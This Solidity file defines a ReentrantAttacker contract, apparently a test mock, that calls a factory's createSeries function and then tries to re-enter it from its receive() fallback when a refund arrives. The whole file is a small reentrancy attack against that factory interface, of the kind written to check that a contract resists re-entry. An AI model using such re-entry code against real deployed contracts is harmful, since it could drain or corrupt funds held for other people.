// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IFactory {
    function createSeries(
        string memory name,
        string memory symbol,
        address protocol,
        uint256 revenueShareBPS,
        uint256 durationDays,
        uint256 totalSupply
    ) external payable returns (address, address);
}

contract ReentrantAttacker {
    IFactory public factory;
    bool public attacking;
    
    constructor(address _factory) {
        factory = IFactory(_factory);
    }
    
    function attack(
        string memory name,
        string memory symbol,
        uint256 revenueShareBPS,
        uint256 durationDays,
        uint256 totalSupply
    ) external payable {
        attacking = true;
        factory.createSeries{value: msg.value}(
            name,
            symbol,
            address(this),
            revenueShareBPS,
            durationDays,
            totalSupply
        );
    }
    
    receive() external payable {
        if (attacking) {
            // Try to reenter on refund
            attacking = false;
            factory.createSeries{value: 0}(
                "Reentrant",
                "REENT",
                address(this),
                2000,
                365,
                1000e18
            );
        }
    }
}
